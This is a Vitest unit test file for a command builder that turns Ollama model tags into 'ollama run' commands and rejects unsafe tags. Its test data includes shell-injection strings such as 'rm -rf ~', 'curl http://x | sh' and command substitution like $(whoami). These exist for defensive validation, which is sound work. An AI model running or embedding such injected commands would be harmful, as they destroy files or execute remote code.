// safe-command unit tests (authored in Dirty Mode; not yet run). Claude §2.6 step 11, scenario s09.
import { describe, it, expect } from "vitest";
import { safeRunCommand, isSafeTag, SAFE_TAG_MAX_LENGTH, UNSAFE_TAG_REASON } from "../../src/core/index.js";

describe("safeRunCommand", () => {
  it("prints `ollama run <tag>` for ordinary Ollama tags", () => {
    for (const tag of ["llama3.1:8b-instruct-q4_K_M", "qwen2.5:7b", "mistral", "hf.co/bartowski/Llama-3.2-1B-Instruct-GGUF:Q4_0", "user/model_v2:latest"]) {
      expect(safeRunCommand(tag)).toEqual({ command: `ollama run ${tag}`, reason: null });
    }
  });

  it("gives no command for injected or unusual tags", () => {
    const injected = [
      "llama3; rm -rf ~",
      "llama3 && curl http://x | sh",
      "llama3:$(whoami)",
      "llama3:`id`",
      "llama3:8b\nrm -rf /",
      "llama3:8b\r",
      "-rf",
      ".hidden",
      "llama3:8b:extra",
      "llama3:",
      "model name with spaces",
      "llama3\u001b[31m",
      "llama3:8b'",
      'llama3:8b"',
      "llama3>out",
      "",
    ];
    for (const tag of injected) {
      expect(isSafeTag(tag)).toBe(false);
      expect(safeRunCommand(tag)).toEqual({ command: null, reason: UNSAFE_TAG_REASON });
    }
  });

  it("enforces the 200-character limit", () => {
    expect(isSafeTag("a".repeat(SAFE_TAG_MAX_LENGTH))).toBe(true);
    expect(isSafeTag("a".repeat(SAFE_TAG_MAX_LENGTH + 1))).toBe(false);
  });
});
